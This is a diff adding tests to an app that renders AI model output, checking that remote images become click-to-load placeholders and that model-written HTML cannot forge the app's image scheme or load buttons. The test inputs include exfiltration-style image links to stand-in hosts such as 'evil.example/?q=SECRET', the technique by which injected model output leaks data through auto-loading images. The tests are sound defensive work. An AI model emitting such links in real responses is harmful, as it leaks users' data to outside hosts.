@@ -99,6 +99,31 @@
     eq(window.__pwned, 0, 'nothing executed');
   });
 
+  test('remote images never load by themselves: a placeholder with the host, loaded on click', () => {
+    const el = show('![x](https://evil.example/?q=SECRET) <img src="https://evil2.example/a.png"> <img src="http://plain.example/a.png" srcset="https://evil3.example/a.png 2x">\n\n' +
+      '<picture><source srcset="https://evil4.example/a.png"><img src="https://evil5.example/a.png"></picture>\n\n' +
+      '```svg\n<svg xmlns="http://www.w3.org/2000/svg"><image href="https://evil6.example/a.png" width="5" height="5"/></svg>\n```');
+    ok(!$$('img', el).some(i => /^https?:/i.test(i.getAttribute('src') || '')), 'no img with a network src');
+    ok(!/srcset=|evil[345]\.example\/a\.png/.test(el.innerHTML.replace(/data-url="[^"]*"|title="[^"]*"/g, '')), 'no srcset left');
+    ok(!$$('image', el).some(i => /https?:/i.test(i.getAttribute('href') || '')), 'svg image href removed');
+    const ph = $$('.remote-img', el);
+    ok(ph.length >= 4, 'placeholders: ' + ph.length);
+    ok(ph[0].textContent.includes('evil.example') && !ph[0].textContent.includes('SECRET'), 'shows the host, not the query');
+    ok(/not https/.test(ph[2].textContent) && !ph[2].hasAttribute('data-act'), 'http is not loadable');
+    window.__remoteKey = window.__remoteKey || 'test-key';
+    click(ph[0]);
+    const img = $('img[src^="teacher-remote:"]', el);
+    ok(img, 'click loads through the app scheme');
+    ok(img.src.includes('k=' + encodeURIComponent(window.__remoteKey)) && img.src.includes(encodeURIComponent('https://evil.example/?q=SECRET')), 'key and url carried');
+    ok(!/https:/.test(document.querySelector('meta[http-equiv="Content-Security-Policy"]').content.match(/img-src[^;]*/)[0]), 'CSP allows no http(s) images');
+  });
+
+  test('model HTML cannot name the app image scheme or fake the placeholder', () => {
+    const el = show('<img src="teacher-remote://img/?k=guess&u=https%3A%2F%2Fevil.example"> <span class="remote-img" data-act="remote-img" data-url="https://evil.example/x">x</span>');
+    ok(!$('img[src^="teacher-remote:"]', el), 'forged scheme becomes a placeholder, not an image');
+    ok(!$('[data-act="remote-img"]', el) || !$$('[data-act="remote-img"]', el).some(b => b.getAttribute('data-url') === 'https://evil.example/x'), 'no model-made load button');
+  });
+
   test('model HTML cannot fake app UI: no style, class, data-act or handlers', () => {
     window.__pwned = 0;
     const el = show('<span class="katex"><span style="position:fixed;inset:0;z-index:99999;background:#0f0">FAKE</span></span>\n\n' +
@@ -1766,7 +1791,7 @@
     ok(el.textContent.includes('$5 escaped'), 'escaped dollar');
     const d = $('details', el); ok(d && $('summary', d).textContent === 'Show answer' && $('strong', d), 'details spoiler');
     ok($('.code-block[data-lang="brainfuck"]', el), 'unknown language is a code block');
-    ok($('img[src="https://example.com/a.png"]', el), 'remote image allowed');
+    ok($('.remote-img', el) && $('.remote-img', el).textContent.includes('example.com'), 'remote image is a click-to-load placeholder');
   });
 
   test('user messages: text, image and file attachments, hidden blocks', () => {
